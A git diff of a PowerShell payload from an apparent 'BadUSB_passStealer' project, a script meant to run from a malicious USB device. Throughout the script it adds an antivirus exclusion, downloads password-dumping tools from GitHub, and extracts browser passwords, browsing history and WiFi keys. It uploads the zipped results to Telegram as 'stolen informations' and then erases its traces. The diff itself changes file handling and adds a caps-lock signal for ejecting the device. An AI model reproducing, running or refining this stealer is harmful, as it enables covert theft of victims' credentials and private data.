@@ -7,19 +7,18 @@
 Set-Location C:\Users\Public\Documents #Go to the folder in which we will download files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
 mkdir dump #Create dump/ directory to put all informations that we'll steal in it
-Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
+Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1 -OutFile fin_upload.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 Invoke-WebRequest LINK -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
-Set-Location dump #Go to dump folder
-.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_passwords.txt #Create the file for Browser passwords
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_history.txt #Create the file for Browser history
-.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_wifi.txt #Create the file for WiFi passwords
-.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_connected_devices.txt #Create the file for connected devices
+.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt #Create the file for Browser history
+.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt #Create the file for WiFi passwords
+.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt #Create the file for connected devices
 Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
-Set-Location ..
+Move-Item -Path "$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt" -Destination dump/
 Compress-Archive dump/ dump.zip #Compress dump/ folder to upload it on telegram
 ./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" #Upload dump.zip on telegram
 Start-Sleep -Seconds 15 #Wait 15 seconds
@@ -32,7 +31,16 @@ Remove-Item WNetWatcher.cfg
 Remove-Item WirelessKeyView.exe
 Remove-Item WebBrowserPassView.exe
 Remove-Item ciaoV2_upload.ps1
+Remove-Item telegram_uploader.exe
+#Enable and disable capslock to know when you can eject BadUSB
+$keyBoardObject = New-Object -ComObject WScript.Shell
+$keyBoardObject.SendKeys("{CAPSLOCK}")
+Start-Sleep -Seconds 1 #Wait 2 seconds
+$keyBoardObject.SendKeys("{CAPSLOCK}")
+Start-Sleep -Seconds 1 #Wait 2 seconds
+$keyBoardObject.SendKeys("{CAPSLOCK}")
+Start-Sleep -Seconds 1 #Wait 2 seconds
+$keyBoardObject.SendKeys("{CAPSLOCK}")
 Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
-Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
-powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
+powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
 exit #End .ps1 file
